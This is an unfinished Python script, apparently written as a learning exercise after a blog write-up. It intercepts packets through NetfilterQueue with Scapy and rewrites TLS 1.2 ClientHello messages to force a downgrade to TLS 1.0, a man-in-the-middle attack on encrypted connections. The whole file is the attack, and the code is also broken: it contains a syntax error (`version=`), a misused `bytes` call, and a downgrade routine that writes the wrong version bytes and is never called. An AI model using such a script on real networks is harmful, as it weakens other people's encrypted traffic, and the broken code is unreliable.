#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
# This one thread on a Python forum was also helpful:
# https://python-forum.io/Thread-NetfilterQueue-set-payload
#
# Also, thanks to Mike D. for teaching me how to join() to fix
# the bytes for set_payload().
#
# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
# https://tls.ulfheim.net
#

from netfilterqueue import NetfilterQueue
from scapy import *
from scapy.layers.tls import *

scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
__builtins__.__dict__.update(scapy_builtins)

nfQueueID         = 0
maxPacketsToStore = 100



def processPacket(packet):
  print("...")
  scapy_packet = IP(packet.get_payload())

  if not scapy_packet.haslayer("Raw"):
    packet.accept();

  else:
    tcpPayload = scapy_packet["Raw"].load

    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
      print("TLS handshake found, client HELLO.")

      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
        print("TLS v1.2, dropping down to v1.0")
        print(scapy_packet.command())

        scapy_packet = craftTLS(scapy_packet)
        packet.set_payload(bytes.scapy_packet)

#        try:
#          scapy_packet = craftTLS(scapy_packet)
#          packet.set_payload(bytes.scapy_packet)
#        except:
#          print("Something failed")
#          packet.accept()   

      packet.accept()   
    
    else:                                                                              
      packet.accept();


def craftTLS(scapy_packet):
  # We want to force TLS down to 1.0 with cipher ECDHE-RSA-AES256-SHA
  #
  # Format from one sniffed TLS Client Hello:
  #
  #IP(frag=0, src='172.17.0.1', proto=6, tos=0, dst='172.17.0.2', chksum=54109, len=188, id=3769, version=4, flags=2, ihl=5, ttl=64)/TCP(reserved=0, seq=1466102824, ack=261469783, dataofs=8, urgptr=0, window=229, flags=24, chksum=10644, dport=5000, sport=48864, options=[('NOP', None), ('NOP', None), ('Timestamp', (448231364, 592815232))])/Raw(load='\x16\x03\x01\x00\x83\x01\x00\x00\x7f\x03\x03 \x10k\x979\xbb\r\x05\xe7p\x06"\x11\xf0Yy}R\xc9vx\xcb\x08\xa5\x0f=\x1a?\x91\xc0\x84\x80\x00\x00\x04\xc0\x14\x00\xff\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00#\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02')
  
  IP_src = scapy_packet["IP"].src
  IP_dst = scapy_packet["IP"].dst

  IP_proto = scapy_packet["IP"].proto
  IP_tos = scapy_packet["IP"].tos
  IP_id = scapy_packet["IP"].id
  IP_version = scapy_packet["IP"].version
  IP_ihl = scapy_packet["IP"].ihl
  IP_ttl = scapy_packet["IP"].ttl

  TCP_sport = scapy_packet["TCP"].sport
  TCP_dport = scapy_packet["TCP"].dport
  TCP_options = scapy_packet["TCP"].options
  
  TCP_reserved = scapy_packet["TCP"].reserved
  TCP_seq = scapy_packet["TCP"].seq
  TCP_ack = scapy_packet["TCP"].ack    
  TCP_ack = scapy_packet["TCP"].ack
  
  ip=IP(src=IP_src, dst=IP_dst)
  tcp=TCP(sport=TCP_sport, dport=TCP_dport, options=TCP_options)
  
  TLS_payload = TLSClientHello(version=)
  
  packet = ip/tcp/TLS_payload
  
  # Sending out the DIY packet
  # Hang on, no, that'll get us stuck in an endless loop. It needs to be accepted.
  #send(packet)
  return packet



def downgradeTLS(scapy_packet):
  del scapy_packet["IP"].chksum
  del scapy_packet["TCP"].chksum

  rawBytes = [b for b in scapy_packet]
  print("Position [61][62] was: ", rawBytes[61], rawBytes[62], ". Needs to change to 0x03 0x01.")

  rawBytes[61] = '\x03'
  rawBytes[62] = '\x03'

  print("Position [61][62] is now: ", rawBytes[61], rawBytes[62], ".")
  
  scapy_packet = b''.join(rawBytes)
  return scapy_packet



print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, processPacket, maxPacketsToStore)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

